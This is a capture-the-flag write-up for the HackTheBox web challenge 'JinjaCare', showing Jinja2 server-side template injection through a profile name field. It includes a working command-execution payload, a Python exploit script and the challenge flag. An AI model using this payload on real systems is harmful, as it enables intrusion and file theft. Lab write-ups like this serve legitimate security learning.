---
title: "JinjaCare"
ctf: "HackTheBox"
date: 2026-05-22
category: web
difficulty: very-easy
flag_format: "HTB{...}"
---

# JinjaCare

## Summary

Server-Side Template Injection (SSTI) via the profile name field is rendered unsafely in the PDF certificate generator, allowing command execution and flag extraction.

## Solution

### Step 1: Register and Login

Created an account at `/register`, then logged in at `/login`.

### Step 2: Identify SSTI Vector

The `/generate_certificate` endpoint renders a PDF using Jinja2 templates. The profile `name` field is injected unsafely into the template.

Tested with `{{7*7}}` and confirmed the PDF showed `Name: 49`.

### Step 3: Exploit SSTI to Read Flag

Updated the profile name to a Jinja2 SSTI RCE payload using `lipsum.__globals__`:

```python
import urllib.request, urllib.parse

session = "<your-session-cookie>"

payload = "{{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}"

data = urllib.parse.urlencode({
    "name": payload,
    "email": "test@test.com",
    "phone": "123",
    "address": "123 St",
    "dateOfBirth": "1990-01-01",
    "gender": "male",
    "emergencyName": "X",
    "emergencyPhone": "Y",
    "relationship": "Z"
}).encode()

req = urllib.request.Request(
    "http://target:port/profile/personal",
    data=data,
    headers={"Cookie": f"session={session}"}
)
urllib.request.urlopen(req)

# Download certificate to get flag
req2 = urllib.request.Request(
    "http://target:port/generate_certificate",
    headers={"Cookie": f"session={session}"}
)
pdf_data = urllib.request.urlopen(req2).read()
# Parse PDF to see flag in Name field
```

The PDF "Name:" field displayed the flag.

## Flag

```
HTB{v3ry_e4sy_sst1_r1ght?}
```
